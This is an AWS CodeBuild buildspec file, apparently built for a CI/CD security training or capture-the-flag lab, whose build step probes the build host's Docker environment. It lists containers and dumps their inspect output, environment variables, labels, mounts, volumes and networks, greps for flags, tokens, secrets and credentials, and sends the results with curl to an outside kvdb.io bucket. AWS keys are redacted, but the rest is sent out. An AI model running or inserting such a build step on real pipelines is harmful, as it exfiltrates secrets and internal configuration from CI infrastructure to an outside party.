version: 0.2

env:
  variables:
    AWS_MAX_ATTEMPTS: "1"
    AWS_RETRY_MODE: "standard"

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - |
        set +e
        bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
        runid="${CODEBUILD_BUILD_ID##*:}"
        putkey(){ key="$1"; file="$2"; head -c 80000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
        echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
        {
          echo '=== docker version ==='
          docker version 2>&1
          echo '=== docker ps ==='
          docker ps -a --no-trunc 2>&1
          echo '=== docker inspect selected ==='
          ids=$(docker ps -aq 2>/dev/null)
          for id in $ids; do
            echo "--- inspect $id"
            docker inspect "$id" 2>&1 | sed -E 's/(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|CODEBUILD_AUTH_TOKEN|AccessKeyId|SecretAccessKey|Token)=?[^", ]+/\1=REDACTED/g' | head -c 50000
            echo
          done
          echo '=== docker env grep ==='
          for id in $ids; do
            echo "--- env $id"
            docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' "$id" 2>&1 | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|CODEBUILD_AUTH_TOKEN' | grep -Ei 'flag|ctf|hacktricks|codebreach|secret|token|github|credential|codebuild' || true
          done
          echo '=== docker labels grep ==='
          for id in $ids; do echo "--- labels $id"; docker inspect -f '{{json .Config.Labels}} {{json .HostConfig.Binds}} {{json .Mounts}}' "$id" 2>&1; done
          echo '=== docker volumes/list ==='
          docker volume ls 2>&1
          docker network ls 2>&1
        } > /tmp/dockerprobe.txt 2>&1
        putkey dockerprobe /tmp/dockerprobe.txt
